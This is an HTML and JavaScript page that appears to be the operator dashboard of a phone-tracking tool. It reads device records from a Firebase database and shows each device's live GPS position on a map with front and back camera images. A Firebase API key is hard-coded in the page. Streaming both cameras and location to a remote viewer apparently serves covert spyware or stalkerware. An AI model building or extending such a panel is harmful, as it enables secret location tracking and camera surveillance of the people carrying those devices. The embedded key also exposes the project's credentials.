<!DOCTYPE html>
<html>
<head>

<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>

<style>

body{
background:black;
color:white;
font-family:Arial;
}

#main{
display:flex;
width:100%;
height:500px;
}

#map{
width:50%;
height:500px;
border:2px solid white;
}

#cameraPanel{
width:50%;
display:flex;
flex-direction:column;
}

.camBox{
width:100%;
height:250px;
border:2px solid white;
}

select{
font-size:18px;
margin:10px;
}

</style>

</head>
<body>

<select id="deviceSelect"></select>

<div id="main">

<iframe id="map"></iframe>

<div id="cameraPanel">

<img id="frontCam" class="camBox">
<img id="backCam" class="camBox">

</div>

</div>

<script>

const firebaseConfig = {
 apiKey: "AIzaSyAiC_oz0Qm99P1K9DcRFQb4eY5GHRujW_c",
 databaseURL: "https://yourlocation-tracker-default-rtdb.asia-southeast1.firebasedatabase.app",
 projectId: "yourlocation-tracker"
};

firebase.initializeApp(firebaseConfig);

let select=document.getElementById("deviceSelect");

firebase.database().ref("devices").on("value",snap=>{

select.innerHTML="";

snap.forEach(child=>{

let option=document.createElement("option");

option.value=child.key;
option.text=child.key;

select.appendChild(option);

});

loadDevice();

});

select.onchange=loadDevice;

function loadDevice(){

let id=select.value;

// LOCATION
firebase.database().ref("devices/"+id+"/location")
.on("value",snap=>{

let data=snap.val();

if(data){

document.getElementById("map").src=
"https://maps.google.com/maps?q="+data.lat+","+data.lon+"&output=embed";

}

});

// FRONT
firebase.database().ref("devices/"+id+"/camera/front")
.on("value",snap=>{

if(snap.val())
document.getElementById("frontCam").src=snap.val().img;

});

// BACK
firebase.database().ref("devices/"+id+"/camera/back")
.on("value",snap=>{

if(snap.val())
document.getElementById("backCam").src=snap.val().img;

});

}

</script>

</body>
</html>
